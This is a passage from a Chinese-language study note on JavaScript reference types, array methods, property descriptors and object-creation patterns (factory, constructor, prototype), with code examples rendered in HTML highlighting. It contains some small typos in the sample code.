class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//解决方法</span><br>objA.<span class="hljs-property">someOther</span>..=<span class="hljs-literal">null</span>;<br>objB.<span class="hljs-property">ano</span>..=<span class="hljs-literal">null</span>;<br></code></pre></td></tr></table></figure><ul><li>性能问题</li><li>引用解除</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createPerson</span>(<span class="hljs-params">name</span>)&#123; <br> <span class="hljs-keyword">var</span> localPerson = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>(); <br> localPerson.<span class="hljs-property">name</span> = name; <br> <span class="hljs-keyword">return</span> localPerson; <br>&#125; <br><span class="hljs-keyword">var</span> globalPerson = <span class="hljs-title function_">createPerson</span>(<span class="hljs-string">&quot;Nicholas&quot;</span>); <br><span class="hljs-comment">// 手工解除 globalPerson 的引用</span><br>globalPerson = <span class="hljs-literal">null</span>; <br><br></code></pre></td></tr></table></figure><h3 id="4-引用类型"><a href="#4-引用类型" class="headerlink" title="4.引用类型"></a>4.引用类型</h3><ul><li>使用对象</li><li>创建、操作数组</li><li>理解基本的JS类型</li><li>使用基本类型和基本包装类型</li></ul><blockquote><p>引用类型的值（对象）是引用类型的一个实例；</p></blockquote><ul><li><h5 id="Object类型"><a href="#Object类型" class="headerlink" title="Object类型"></a>Object类型</h5></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//创建Object实例</span><br><span class="hljs-comment">//1.new操作符后跟Object构造函数</span><br><span class="hljs-keyword">var</span> person=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>person.<span class="hljs-property">name</span>=<span class="hljs-string">&quot;Martin&quot;</span>;<br>person.<span class="hljs-property">age</span>=<span class="hljs-number">29</span>;<br><br><span class="hljs-comment">//2.对象字面量表示法</span><br><span class="hljs-keyword">var</span> person=&#123;<br>    <span class="hljs-attr">name</span>:<span class="hljs-string">&quot;Martin&quot;</span>,<br>    <span class="hljs-attr">age</span>:<span class="hljs-number">29</span>,<br>    <span class="hljs-string">&quot;address&quot;</span>:<span class="hljs-string">&quot;江苏省东南大学&quot;</span><span class="hljs-comment">//属性名可以使用字符串，最后一个属性后不加逗号，会在早的版本导致错误</span><br>&#125;<br><br><br></code></pre></td></tr></table></figure><ul><li><h5 id="Array类型"><a href="#Array类型" class="headerlink" title="Array类型"></a>Array类型</h5></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//ES的数组每一项可以保存不同类型的数据；大小动态调整；</span><br><br><span class="hljs-comment">//创建方式</span><br><span class="hljs-comment">//1.Array构造函数；</span><br><span class="hljs-keyword">var</span> colors=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">20</span>);<br><span class="hljs-keyword">var</span> colors=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-string">&quot;red&quot;</span>,<span class="hljs-string">&quot;blue&quot;</span>,<span class="hljs-string">&quot;yellow&quot;</span>);<br><span class="hljs-comment">//也可以省略new</span><br><span class="hljs-keyword">var</span> colors=<span class="hljs-title class_">Array</span>(<span class="hljs-number">3</span>);<br><br><span class="hljs-comment">//2.数组字面量表示法 </span><br><span class="hljs-keyword">var</span> colors=[<span class="hljs-string">&quot;red&quot;</span>,<span class="hljs-string">&quot;blue&quot;</span>,<span class="hljs-string">&quot;yellow&quot;</span>];<br><br><span class="hljs-keyword">var</span> nums=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,]<span class="hljs-comment">//不要这样！！！</span><br><span class="hljs-keyword">var</span> options=[，，，] <span class="hljs-comment">//不要这样；</span><br><br><span class="hljs-comment">//添加元素</span><br>color[color.<span class="hljs-property">length</span>]=<span class="hljs-string">&quot;black&quot;</span>;<br><br><span class="hljs-comment">//检测数组instanceof 问题在于如果存在两个不同的Array构造函数，会出错；</span><br><span class="hljs-keyword">if</span>(value <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span>)&#123;<br>    ...<br>&#125;<br>    <br><span class="hljs-comment">//更好的方法</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(value))&#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//转换方法</span><br><span class="hljs-keyword">var</span> colors = [<span class="hljs-string">&quot;red&quot;</span>, <span class="hljs-string">&quot;blue&quot;</span>, <span class="hljs-string">&quot;green&quot;</span>]; <span class="hljs-comment">// 创建一个包含 3 个字符串的数组</span><br><span class="hljs-title function_">alert</span>(colors.<span class="hljs-title function_">toString</span>()); <span class="hljs-comment">// red,blue,green </span><br><span class="hljs-title function_">alert</span>(colors.<span class="hljs-title function_">valueOf</span>()); <span class="hljs-comment">// red,blue,green </span><br><span class="hljs-title function_">alert</span>(colors); <span class="hljs-comment">// red,blue,green。由于 alert()要接收字符串参数，所以它会在后台调用 toString()方法，由此会得到与直接调用 toString()方法相同的结果</span><br><br><span class="hljs-comment">//栈方法</span><br>array.<span class="hljs-title function_">push</span>();<span class="hljs-comment">//尾部压入</span><br>array.<span class="hljs-title function_">pop</span>();<span class="hljs-comment">//尾部弹出</span><br><br><span class="hljs-comment">//队列方法</span><br>array.<span class="hljs-title function_">push</span>();<span class="hljs-comment">//尾部入队</span><br>array.<span class="hljs-title function_">shift</span>();<span class="hljs-comment">//首部出队</span><br>array.<span class="hljs-title function_">unshift</span>();<span class="hljs-comment">//首部入队</span><br><br><span class="hljs-comment">//重排序方法</span><br>array.<span class="hljs-title function_">sort</span>();<span class="hljs-comment">//升序排列，方法会调用每个数组项的 toString()转型方法，然后比较得到的字符串</span><br>array.<span class="hljs-title function_">reverse</span>();<span class="hljs-comment">//反转数组</span><br><br><span class="hljs-comment">//sort方法可以接受一个比较函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">compare</span>(<span class="hljs-params">value1, value2</span>) &#123; <br> <span class="hljs-keyword">if</span> (value1 &lt; value2) &#123; <br> <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <br> &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value1 &gt; value2) &#123; <br> <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>; <br> &#125; <span class="hljs-keyword">else</span> &#123; <br> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br> &#125; <br>&#125; <br><span class="hljs-keyword">var</span> values = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>]; <br>values.<span class="hljs-title function_">sort</span>(compare); <br><span class="hljs-title function_">alert</span>(values); <span class="hljs-comment">// 15,10,5,1,0</span><br><br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//操作方法</span><br><span class="hljs-comment">//concat（）方法基于当前数组项创建一个新的数组；</span><br><span class="hljs-keyword">var</span> colors=[<span class="hljs-string">&quot;red&quot;</span>,<span class="hljs-string">&quot;yellow&quot;</span>];<br><span class="hljs-keyword">var</span> colors2=colors.<span class="hljs-title function_">concat</span>(<span class="hljs-string">&quot;green&quot;</span>,[<span class="hljs-string">&quot;blue&quot;</span>,<span class="hljs-string">&quot;grey&quot;</span>]);<br><br><span class="hljs-comment">//slice（）方法接受一或者两个参数，为岂止位置；</span><br><span class="hljs-comment">//slice方法不会影响原始数组；</span><br><span class="hljs-keyword">var</span> colors = [<span class="hljs-string">&quot;red&quot;</span>, <span class="hljs-string">&quot;green&quot;</span>, <span class="hljs-string">&quot;blue&quot;</span>, <span class="hljs-string">&quot;yellow&quot;</span>, <span class="hljs-string">&quot;purple&quot;</span>]; <br><span class="hljs-keyword">var</span> colors2 = colors.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>); <br><span class="hljs-keyword">var</span> colors3 = colors.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>); <br><br><span class="hljs-comment">//splice()方法</span><br><span class="hljs-title function_">splice</span>(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>);  <span class="hljs-comment">//删除前两项</span><br><span class="hljs-title function_">splice</span>(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&quot;red&quot;</span>,<span class="hljs-string">&quot;green&quot;</span>)  <span class="hljs-comment">//从位置2开始插入red,green;</span><br><span class="hljs-title function_">splice</span>(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;red&quot;</span>)<span class="hljs-comment">//替换第二项为red；</span><br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//位置方法</span><br><span class="hljs-title function_">indexOf</span>()<span class="hljs-comment">//从头开始查找</span><br><span class="hljs-title function_">lastIndexOf</span>()<span class="hljs-comment">//从尾部开始查找</span><br><br><br></code></pre></td></tr></table></figure><h3 id="5-迭代方法"><a href="#5-迭代方法" class="headerlink" title="5.迭代方法"></a>5.迭代方法</h3><ul><li>every():对数组中的每一项运行给定函数，如果该函数对每一项都返回 true，则返回 true。</li><li>some()：对数组中的每一项运行给定函数，如果该函数对任一项返回 true，则返回 true。</li><li>filter():对数组中的每一项运行给定函数，返回该函数会返回 true 的项组成的数组.</li><li>foreach():：对数组中的每一项运行给定函数。这个方法没有返回值。</li><li>map()：对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组。</li></ul><h3 id="6-归并方法"><a href="#6-归并方法" class="headerlink" title="6.归并方法"></a>6.归并方法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//reduce():从第一项开始遍历；</span><br><span class="hljs-comment">//reduceRight():从最后一项开始遍历；</span><br><span class="hljs-comment">//接受的参数：prev,next，索引，数组对象</span><br><span class="hljs-keyword">var</span> values=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>];<br><span class="hljs-comment">//第一次调用，pre=1.cur=2;第二次：pre=3(1+2的结果)，cur=3</span><br><span class="hljs-keyword">var</span> sum=values.<span class="hljs-title function_">reduce</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">prev,cur,index,array</span>)=&gt;&#123;<br>                      <span class="hljs-keyword">return</span> prev+cur;<br>                      &#125;);<br><span class="hljs-title function_">alert</span>(sum);<span class="hljs-comment">//15</span><br><br></code></pre></td></tr></table></figure><h3 id="7-正则表达式"><a href="#7-正则表达式" class="headerlink" title="7.正则表达式"></a>7.正则表达式</h3><h2 id="二、面向对象的程序设计"><a href="#二、面向对象的程序设计" class="headerlink" title="二、面向对象的程序设计"></a>二、面向对象的程序设计</h2><ul><li>理解对象属性</li><li>理解并创建对象</li><li>理解继承</li></ul><h3 id="1-属性类型"><a href="#1-属性类型" class="headerlink" title="1.属性类型"></a>1.属性类型</h3><blockquote><p>ES中有两种属性：数据属性和访问器属性</p></blockquote><ul><li>数据属性</li></ul><blockquote><p>数据属性包含一个数据值的位置，在这个位置可以读取和写入值。</p><ol><li>Configurable：表示是否能通过delete删除属性从而重新定义属性，能否修改属性的特性，能否把属性修改为访问器属性；默认为true；</li><li>Enumerable：表示是否可以通过for-in循环返回属性；默认为true;</li><li>Writable:表示能否修改属性的值；默认为true；</li><li>Value:数据值，默认为undefined；</li></ol></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> person=&#123;&#125;;<br><span class="hljs-title class_">Objcect</span>.<span class="hljs-title function_">defineProperty</span>(person.<span class="hljs-string">&quot;name&quot;</span>,&#123;<br>                       <span class="hljs-attr">configuable</span>:<span class="hljs-literal">false</span>,<span class="hljs-comment">//一旦设置为false,就不能变回可配置的了；</span><br>                       <span class="hljs-attr">writable</span>:<span class="hljs-literal">false</span>,<br>                       <span class="hljs-attr">value</span>:<span class="hljs-string">&quot;Martin&quot;</span>，<br>                       &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-property">name</span>);<span class="hljs-comment">//&quot;Martin&quot;</span><br>person.<span class="hljs-property">name</span>=<span class="hljs-string">&quot;Jack&quot;</span>;<span class="hljs-comment">//无法修改，非严格模式下赋值会被忽略；严格模式下，抛出错误；</span><br></code></pre></td></tr></table></figure><ul><li>访问器属性</li></ul><blockquote><p>不包含数据值，包含一对儿~~</p><p>getter()和setter();</p><ol><li>configurable:表示是否能通过delete删除属性从而重新定义属性，能否修改属性的特性，能否把属性修改为访问器属性；默认为true；</li><li>Enumerable：表示是否可以通过for-in循环返回属性；默认为true;</li><li>Get:读取属性时调用，默认undefined；</li><li>Set:写入属性时调用，默认undefined；</li></ol></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> book=&#123;<br>    <span class="hljs-attr">_year</span>:<span class="hljs-number">2004</span>,<span class="hljs-comment">//前置下划线表示只可以通过对象方法访问；</span><br>    <span class="hljs-attr">edition</span>:<span class="hljs-number">1</span><br>&#125;;<br><br><span class="hljs-title class_">Objcect</span>.<span class="hljs-title function_">defineProperty</span>(book,<span class="hljs-string">&quot;year&quot;</span>,&#123;<br>    <span class="hljs-attr">get</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-comment">//只写getter意味着不能写，写入会被忽略；严格模式报错；</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_year</span>;<br>    &#125;,<br>    <span class="hljs-attr">set</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">newValue</span>)&#123;<br>        <span class="hljs-keyword">if</span>(newValue&gt;<span class="hljs-number">2004</span>)&#123;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">_year</span>=newValue;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">edition</span>+=newValue-<span class="hljs-number">2004</span>;<br>        &#125;<br>    &#125;<br>&#125;);<br><br><span class="hljs-comment">//定义多个属性</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperties</span>(book,&#123;<br>    <span class="hljs-attr">_year</span>:&#123;<br>        <span class="hljs-attr">value</span>:<span class="hljs-number">2004</span>,<br>    &#125;,<br>    <span class="hljs-attr">edition</span>:&#123;<br>        <span class="hljs-attr">value</span>:<span class="hljs-number">1</span><br>    &#125;,<br>    <span class="hljs-attr">year</span>:&#123;<br>       <span class="hljs-attr">get</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-comment">//只写getter意味着不能写，写入会被忽略；严格模式报错；</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_year</span>;<br>        &#125;,<br>        <span class="hljs-attr">set</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">newValue</span>)&#123;<br>            <span class="hljs-keyword">if</span>(newValue&gt;<span class="hljs-number">2004</span>)&#123;<br>                <span class="hljs-variable language_">this</span>.<span class="hljs-property">_year</span>=newValue;<br>                <span class="hljs-variable language_">this</span>.<span class="hljs-property">edition</span>+=newValue-<span class="hljs-number">2004</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;)<br><br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//读取属性的特性</span><br><span class="hljs-keyword">var</span> year=<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyDescriptor</span>(book,<span class="hljs-string">&quot;_year&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(year.<span class="hljs-property">value</span>);<br></code></pre></td></tr></table></figure><h3 id="2-创建对象"><a href="#2-创建对象" class="headerlink" title="2.创建对象"></a>2.创建对象</h3><blockquote><p>工厂模式抽象了具体创建对象的过程，考虑到ES中无法创建类，开发人员就发明了一i中函数</p></blockquote><h5 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createPerson</span>(<span class="hljs-params">name,age,job</span>)&#123;<br>    <span class="hljs-keyword">var</span> o=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Objcet</span>();<br>    o.<span class="hljs-property">name</span>=name;<br>    o.<span class="hljs-property">age</span>=age;<br>    o.<span class="hljs-property">job</span>=job;<br>    o.<span class="hljs-property">sayName</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>    &#125;;<br>    <span class="hljs-keyword">return</span> o;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>工厂模式虽然解决了创建多个相似对象的问题，但是没有解决对象识别的问题，无法知道一个对象的类型；</p></blockquote><h5 id="构造函数模式"><a href="#构造函数模式" class="headerlink" title="构造函数模式"></a>构造函数模式</h5><blockquote><p>ES中的构造函数能船舰特定类型的对象；</p><p>像Object和Array这样的原生构造函数，运行时会自动出现再执行环境；</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name,age,job</span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>=name;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span>=age;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">job</span>=job;<br>    <br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">sayName</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>除了相同部分，有如下区别：</p><ul><li>没有显式的创建对象；</li><li>直接将属性和方法赋给了this对象；</li><li>没有return；</li></ul><p>Note：构造函数使用应该使用首字母大写的开头，非构造函数小写字母开头；</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//要创建Person实例，需要使用new</span><br><span class="hljs-keyword">let</span> newPerson=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Martin&quot;</span>,<span class="hljs-number">18</span>,<span class="hljs-string">&quot;Programmer&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(newPerson.<span class="hljs-property">constructor</span>==<span class="hljs-title class_">Person</span>);   <span class="hljs-comment">//true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(newPerson <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Person</span>);<span class="hljs-comment">//true</span><br></code></pre></td></tr></table></figure><blockquote><p>创建自定义的构造函数意味着将来可以将他的实例标识为一种特定的类型；</p><p>构造函数虽然好用，但是也不是没有缺点。</p><p>主要问题是：每个方法都要再实例上重新创建一遍；</p><p>不同实例创建相同函数名的函数，会导致不同的作用域链和标识符解析。</p><p>创建相同的Function实例完全没有必要，况且有this对象在根本不用在执行代码前九八函数绑定到特定的对象上面；</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//优化方法</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name,age</span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>=name;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span>=age;<br>    <br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">sayName</span>=sayName;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">sayName</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>构造函数内部将sayName属性设置成全局的sayName函数。</p><p>新的问题：虽然方法定义在全局作用域，但实际上只能被某个对象调用，让全局作用域名不副实；</p><p>更进一步，如果一个对象需要定义很多方法，则需要定义多个全局函数，失去封装性；</p></blockquote><h5 id="原型模式"><a href="#原型模式" class="headerlink" title="原型模式"></a>原型模式</h5><blockquote><p>我们创建的每个函数都有一个prototype属性，这个属性是一个指针，指向一个对象。</p><p>Prototype就是通过调用构造函数而创建的那个对象实例的原型对象；</p><p>使用原型对象的好处是可以让所有对象实例共享它所包含的属性和方法，即不用再构造函数中定义对象实例的信息，而是将这些信息直接添加到原型对象中；</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"></span>)&#123;<br>    <br>&#125;<br><br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">name</span>=<span class="hljs-string">&quot;Martin&quot;</span>;<br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">age</span>=<span class="hljs-number">23</span>;<br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayName</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>&#125;;<br><br><span class="hljs-keyword">var</span> person1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><span class="hljs-keyword">var</span> person2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>person1.<span class="hljs-property">name</span>=<span class="hljs-string">&quot;Martin&quot;</span><br>person2.<span class="hljs-property">name</span>=<span class="hljs-string">&quot;Jack&quot;</span><br>person1.<span class="hljs-title function_">sayName</span>();   <span class="hljs-comment">//&quot;Martin&quot;</span><br>person2.<span class="hljs-title function_">sayName</span>();<span class="hljs-comment">//&quot;Jack&quot;</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person1.<span class="hljs-title function_">sayName</span>()==person2.<span class="hljs-title function_">sayName</span>())<span class="hljs-comment">//true</span><br></code></pre></td></tr></table></figure><h5 id="理解原型对象"><a href="#理解原型对象" class="headerlink" title="理解原型对象"></a>理解原型对象</h5><blockquote><p>无论什么时候，只要创建了新韩淑，会为这个函数创建一个prototype属性，这个属性指向函数的原型对象。</p><p>默认情况下，所有原型对象都会自动获得一个constructor属性，这个属性包含一个指向prototype属性所在函数的指针。</p><p>举前面的例子：</p><p>Person.prototype.constructor指向Person，通过这个构造函数可以伪原型对象添加其他属性；</p></blockquote><p><img src="https://s3.bmp.ovh/imgs/2023/03/08/953a324fdcd4fa42.png"></p><blockquote><p>当为对象实例添加一个属性时，属性会屏蔽原型对象中保存的同名属性；</p><p>原型对象中的属性值不变；只会修改实例中的属性；</p><p>使用delete操作符可以完全删除实例属性，达到访问原型属性值的目的；</p><p>使用hasOwnProperty()来检查属性值是来自于原型还是实例；</p></blockquote><p><img src="https://s3.bmp.ovh/imgs/2023/03/08/b6a6f03230b36450.png"></p><h5 id="原型与in操作符"><a href="#原型与in操作符" class="headerlink" title="原型与in操作符"></a>原型与in操作符</h5><blockquote><p>有两种方式使用in操作符：单独使用和for-in循环使用；</p><p>单独使用：通过对象能返回给定属性时返回true（不论原型和实例）；hasOwnProperty()只适用于实例；</p><p>tips:如果in返回true而hasOwnProperty()返回false，可以确定属性是原型中的属性；</p><p>for-in中使用：返回的是通过对象访问的，可以枚举的属性；</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//获得对象上所有的可枚举实例</span><br>object.<span class="hljs-title function_">keys</span>();<br><br><span class="hljs-keyword">var</span> p=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><span class="hljs-keyword">var</span> 